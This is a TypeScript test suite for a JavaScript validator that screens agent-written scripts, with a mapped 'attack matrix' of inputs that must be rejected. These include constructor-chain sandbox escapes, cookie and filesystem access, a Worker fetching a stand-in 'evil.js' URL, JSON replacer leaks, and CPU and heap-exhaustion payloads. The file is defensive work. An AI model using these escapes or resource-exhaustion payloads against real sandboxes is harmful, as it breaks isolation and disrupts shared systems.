import { JSAstValidator } from '../validator';
import { createAgentScriptPreset } from '../presets/agentscript.preset';

/**
 * AgentScript Attack Matrix Alignment
 *
 * Mirrors critical ATK scenarios from enclave-vm's attack matrix to ensure
 * the AgentScript preset blocks the same primitives before code reaches runtime.
 */
describe('AgentScript Attack Matrix', () => {
  const wrap = (body: string) => `
    async function __ag_main() {
      ${body}
    }
  `;

  const createValidator = () => new JSAstValidator(createAgentScriptPreset());

  const expectBlocked = async (
    validator: JSAstValidator,
    code: string,
    assertion?: (result: Awaited<ReturnType<JSAstValidator['validate']>>) => void,
  ) => {
    const result = await validator.validate(code);
    expect(result.valid).toBe(false);
    if (assertion) {
      assertion(result);
    } else {
      expect(result.issues.length).toBeGreaterThan(0);
    }
  };

  describe('Direct Global Access · ATK-7/8/10', () => {
    it('ATK-7: blocks browser globals like document', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const cookies = document.cookie;
          return cookies;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'UNKNOWN_GLOBAL')).toBe(true);
        },
      );
    });

    it('ATK-8: blocks CommonJS module access (module)', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const fs = module.require('fs');
          return fs;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });

    it('ATK-8: blocks CommonJS module access (exports)', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          exports.pwned = true;
          return exports;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });

    it('ATK-10: blocks dynamic import attempts', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const mod = await import('fs');
          return mod;
        `),
      );
    });
  });

  describe('Constructor Chain Escapes · ATK-3/17/18/32', () => {
    it('ATK-3: blocks Error.constructor.constructor chain', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const runner = new Error().constructor.constructor('return process')();
          return runner;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });

    it('ATK-18: blocks AsyncFunction constructor access', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const AsyncFn = (async function(){ }).constructor;
          return AsyncFn('return this')();
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });

    it('ATK-32: blocks optional chaining to constructor', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const obj = {};
          const runner = obj?.constructor?.constructor('return globalThis')();
          return runner;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });
  });

  describe('Stack Trace & Error Object Manipulation · ATK-4', () => {
    it('ATK-4: blocks Error.prepareStackTrace tampering', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          Error.prepareStackTrace = () => 'hacked';
          return Error.prepareStackTrace;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });
  });

  describe('Prototype & Meta-Programming APIs · ATK-24/25/33/35/36', () => {
    it('ATK-25: blocks Object.setPrototypeOf manipulation', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const obj = {};
          Object.setPrototypeOf(obj, Function.prototype);
          return obj;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'NO_META_PROGRAMMING')).toBe(true);
        },
      );
    });

    it('ATK-33: blocks Reflect.get on globals', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const proc = Reflect.get(globalThis, 'process');
          return proc;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });

    it('ATK-35: blocks Object.getOwnPropertyDescriptor leaks', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const desc = Object.getOwnPropertyDescriptor(globalThis, 'process');
          return desc;
        `),
        (result) => {
          expect(result.issues.some((issue) => ['NO_META_PROGRAMMING', 'NO_GLOBAL_ACCESS'].includes(issue.code))).toBe(
            true,
          );
        },
      );
    });

    it('ATK-36: blocks Proxy constructor usage', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const proxy = new Proxy({}, { get(){ return 'pwned'; } });
          return proxy.value;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });
  });

  describe('Resource Exhaustion & Timing · ATK-41/44/47/48/62-67', () => {
    it('ATK-41: blocks Promise chain storms', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          let chain = Promise.resolve(0);
          chain = chain.then(() => Promise.resolve(1));
          return chain;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });

    it('ATK-44: blocks access to high-resolution timers', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const value = performance.now();
          return value;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });

    it('ATK-47/48: blocks SharedArrayBuffer and Atomics usage', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const buf = new SharedArrayBuffer(16);
          const view = new Int32Array(buf);
          Atomics.add(view, 0, 1);
          return view;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });
  });

  describe('Worker & Concurrency Primitives · ATK-65/67/71', () => {
    it('ATK-65: blocks microtask flooding helpers via queueMicrotask', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          queueMicrotask(() => {});
          return 1;
        `),
      );
    });

    it('ATK-67: blocks Worker-based sandbox escapes', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const worker = new Worker('http://example.com/evil.js');
          return worker;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'DISALLOWED_IDENTIFIER')).toBe(true);
        },
      );
    });
  });

  describe('JSON Callback Attacks · Vector 960', () => {
    it('Vector 960: blocks JSON.stringify with arrow function replacer (Native Walker leak)', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const keysFound = [];
          const walker = (key, value) => {
            if (key && key.length > 0) {
              keysFound.push(key);
            }
            return value;
          };
          JSON.stringify(this, walker);
          return keysFound;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(true);
        },
      );
    });

    it('Vector 960: blocks JSON.stringify with inline arrow function replacer', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const result = JSON.stringify({a: 1}, (k, v) => v);
          return result;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(true);
        },
      );
    });

    it('Vector 960: blocks JSON.stringify with function expression replacer', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const result = JSON.stringify({a: 1}, function(k, v) { return v; });
          return result;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(true);
        },
      );
    });

    it('Vector 960: blocks JSON.stringify with identifier replacer (variable reference)', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const replacer = (k, v) => v;
          const result = JSON.stringify({a: 1}, replacer);
          return result;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(true);
        },
      );
    });

    it('Vector 960: blocks JSON.parse with reviver function', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const result = JSON.parse('{"a":1}', (k, v) => v);
          return result;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(true);
        },
      );
    });

    it('Vector 960: blocks JSON?.stringify with optional chaining and replacer function', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const result = JSON?.stringify({a: 1}, (k, v) => v);
          return result;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(true);
        },
      );
    });

    it('Vector 960: blocks JSON?.parse with optional chaining and reviver function', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const result = JSON?.parse('{"a":1}', (k, v) => v);
          return result;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(true);
        },
      );
    });

    it('allows JSON.stringify without replacer', async () => {
      const validator = createValidator();
      const result = await validator.validate(
        wrap(`
          const result = JSON.stringify({a: 1});
          return result;
        `),
      );
      // Should not have JSON_CALLBACK_NOT_ALLOWED error
      expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(false);
    });

    it('allows JSON.stringify with null replacer', async () => {
      const validator = createValidator();
      const result = await validator.validate(
        wrap(`
          const result = JSON.stringify({a: 1}, null, 2);
          return result;
        `),
      );
      // Should not have JSON_CALLBACK_NOT_ALLOWED error
      expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(false);
    });

    it('allows JSON.stringify with array replacer (property allowlist)', async () => {
      const validator = createValidator();
      const result = await validator.validate(
        wrap(`
          const result = JSON.stringify({a: 1, b: 2}, ['a']);
          return result;
        `),
      );
      // Should not have JSON_CALLBACK_NOT_ALLOWED error
      expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(false);
    });

    it('allows JSON.parse without reviver', async () => {
      const validator = createValidator();
      const result = await validator.validate(
        wrap(`
          const result = JSON.parse('{"a":1}');
          return result;
        `),
      );
      // Should not have JSON_CALLBACK_NOT_ALLOWED error
      expect(result.issues.some((issue) => issue.code === 'JSON_CALLBACK_NOT_ALLOWED')).toBe(false);
    });
  });

  describe('Array Fill CPU Exhaustion · Vector 1110', () => {
    it('Vector 1110: blocks Array(n).fill() with large size (High-Precision Math Stall)', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const size = 500000;
          const work = Array(size).fill(0.12345);
          const result = work.reduce((acc, val) => acc + Math.sin(val), 0);
          return result;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION')).toBe(true);
        },
      );
    });

    it('Vector 1110: blocks new Array(n).fill() with large size', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const work = new Array(500000).fill(0);
          return work.length;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION')).toBe(true);
        },
      );
    });

    it('Vector 1110: blocks Array(n).fill() with literal large size', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const work = Array(200000).fill(1);
          return work;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION')).toBe(true);
        },
      );
    });

    it('Vector 1110: blocks Array(variable).fill() with dynamic size', async () => {
      const validator = createValidator();
      await expectBlocked(
        validator,
        wrap(`
          const size = 100;
          const work = Array(size).fill(0);
          return work;
        `),
        (result) => {
          // Should block dynamic size as error since we can't verify it statically
          expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION')).toBe(true);
        },
      );
    });

    it('allows Array(n).fill() with small size', async () => {
      const validator = createValidator();
      const result = await validator.validate(
        wrap(`
          const work = Array(100).fill(0);
          return work;
        `),
      );
      // Should not have RESOURCE_EXHAUSTION error (only warning for dynamic is acceptable)
      expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION' && issue.severity === 'error')).toBe(
        false,
      );
    });

    it('allows small array operations for legitimate use', async () => {
      const validator = createValidator();
      const result = await validator.validate(
        wrap(`
          const items = Array(10).fill(0);
          const doubled = items.map((x) => x * 2);
          return doubled;
        `),
      );
      // Should not have RESOURCE_EXHAUSTION error
      expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION' && issue.severity === 'error')).toBe(
        false,
      );
    });
  });

  describe('Recursive Template Buffer Overflow · Vector 1160', () => {
    it('Vector 1160: blocks Array(1450000).fill() in toString (Recursive Template Buffer Overflow)', async () => {
      const validator = createValidator();
      // This attack uses Array(1450000).fill() which exceeds maxArrayFillSize (100000)
      await expectBlocked(
        validator,
        wrap(`
          const fragment = {
            length: 1,
            toString: () => {
              Array(1450000).fill(0.123).reduce((a, b) => a + Math.sqrt(b), 0);
              return "done";
            }
          };
          return fragment;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION')).toBe(true);
        },
      );
    });

    it('Vector 1160: blocks large string.repeat() in toString', async () => {
      const validator = createValidator();
      // This attack uses .repeat(1024 * 1024 * 2) = 2,097,152 which exceeds maxStringRepeat (100000)
      await expectBlocked(
        validator,
        wrap(`
          const fragment = {
            toString: () => {
              return "A".repeat(2097152);
            }
          };
          return fragment;
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION')).toBe(true);
        },
      );
    });

    it('Vector 1160: blocks combined Array.fill + string.repeat attack', async () => {
      const validator = createValidator();
      // Full Vector 1160 attack pattern
      await expectBlocked(
        validator,
        wrap(`
          const s = String.fromCharCode;
          const fragment = {
            length: 1,
            toString: () => {
              Array(1450000).fill(0.123).reduce((a, b) => a + Math.sqrt(b), 0);
              return s(65).repeat(1024 * 1024 * 2);
            }
          };
          const bomb = \`\${fragment}\${fragment}\`;
          await callTool("users.search", { query: bomb });
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION')).toBe(true);
        },
      );
    });

    it('allows template literals with safe interpolations', async () => {
      const validator = createValidator();
      const result = await validator.validate(
        wrap(`
          const name = "test";
          const value = 42;
          const message = \`Hello \${name}, your value is \${value}\`;
          return message;
        `),
      );
      // Should not have RESOURCE_EXHAUSTION error
      expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION' && issue.severity === 'error')).toBe(
        false,
      );
    });
  });

  describe('Interleaved Heap Spray · Vector 1170', () => {
    it('Vector 1170: blocks Array(1420000).fill() CPU stall (Interleaved Heap Spray)', async () => {
      const validator = createValidator();
      // This attack uses Array(1420000).fill() which exceeds maxArrayFillSize (100000)
      await expectBlocked(
        validator,
        wrap(`
          const size = 1420000;
          Array(size).fill(0.123).reduce((a, b) => a + Math.sqrt(b), 0);
          return "done";
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION')).toBe(true);
        },
      );
    });

    it('Vector 1170: blocks full Interleaved Heap Spray attack pattern', async () => {
      const validator = createValidator();
      // Full Vector 1170 attack - CPU stall + string table spray
      await expectBlocked(
        validator,
        wrap(`
          const s = String.fromCharCode;
          const size = 1420000;
          Array(size).fill(0.123).reduce((a, b) => a + Math.sqrt(b), 0);
          const spray = Array(1000).fill(0).map((_, i) => {
            return s(83, 69, 67, 82, 69, 84) + i + s(61) + Math.random();
          });
          await callTool("users.search", { data: spray });
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION')).toBe(true);
        },
      );
    });

    it('Vector 1170: blocks literal large array fill for CPU stall', async () => {
      const validator = createValidator();
      // Direct literal size that exceeds limit
      await expectBlocked(
        validator,
        wrap(`
          Array(1420000).fill(0.123).reduce((a, b) => a + Math.sqrt(b), 0);
          return "stalled";
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION')).toBe(true);
        },
      );
    });

    it('allows small array spray for legitimate use (Vector 1170 secondary pattern)', async () => {
      const validator = createValidator();
      // The secondary spray pattern with small arrays should be allowed
      const result = await validator.validate(
        wrap(`
          const s = String.fromCharCode;
          const spray = Array(100).fill(0).map((_, i) => {
            return s(72, 69, 76, 76, 79) + i;
          });
          await callTool("users.search", { data: spray });
        `),
      );
      // Should not have RESOURCE_EXHAUSTION error for small arrays
      expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION' && issue.severity === 'error')).toBe(
        false,
      );
    });
  });

  describe('String-Deduplication Pressure Test · Vector 1220', () => {
    it('Vector 1220: blocks Array(1400000).fill() CPU stall (String-Deduplication Pressure)', async () => {
      const validator = createValidator();
      // This attack uses Array(1400000).fill() which exceeds maxArrayFillSize (100000)
      await expectBlocked(
        validator,
        wrap(`
          const workSize = 1400000;
          Array(workSize).fill(0.123).reduce((a, b) => a + Math.sqrt(b), 0);
          return "done";
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION')).toBe(true);
        },
      );
    });

    it('Vector 1220: blocks literal large array fill for CPU stall', async () => {
      const validator = createValidator();
      // Direct literal size that exceeds limit
      await expectBlocked(
        validator,
        wrap(`
          Array(1400000).fill(0.123).reduce((a, b) => a + Math.sqrt(b), 0);
          return "stalled";
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION')).toBe(true);
        },
      );
    });

    it('Vector 1220: blocks full String-Deduplication Pressure attack pattern', async () => {
      const validator = createValidator();
      // Full Vector 1220 attack - CPU stall + high-entropy string generation
      await expectBlocked(
        validator,
        wrap(`
          const s = String.fromCharCode;
          const workSize = 1400000;
          Array(workSize).fill(0.123).reduce((a, b) => a + Math.sqrt(b), 0);
          const entropy = Array(1000).fill(s(83, 69, 67, 82, 69, 84)).map((base, i) => {
            return base + s(95) + Math.random() + i;
          });
          await callTool("users.search", {
            filter: entropy.join(s(124))
          });
        `),
        (result) => {
          expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION')).toBe(true);
        },
      );
    });

    it('allows small high-entropy string generation for legitimate use', async () => {
      const validator = createValidator();
      // Small array for string generation should be allowed
      const result = await validator.validate(
        wrap(`
          const s = String.fromCharCode;
          const entropy = Array(100).fill(s(72, 69, 76, 76, 79)).map((base, i) => {
            return base + s(95) + i;
          });
          await callTool("users.search", { filter: entropy.join(s(124)) });
        `),
      );
      // Should not have RESOURCE_EXHAUSTION error for small arrays
      expect(result.issues.some((issue) => issue.code === 'RESOURCE_EXHAUSTION' && issue.severity === 'error')).toBe(
        false,
      );
    });
  });
});
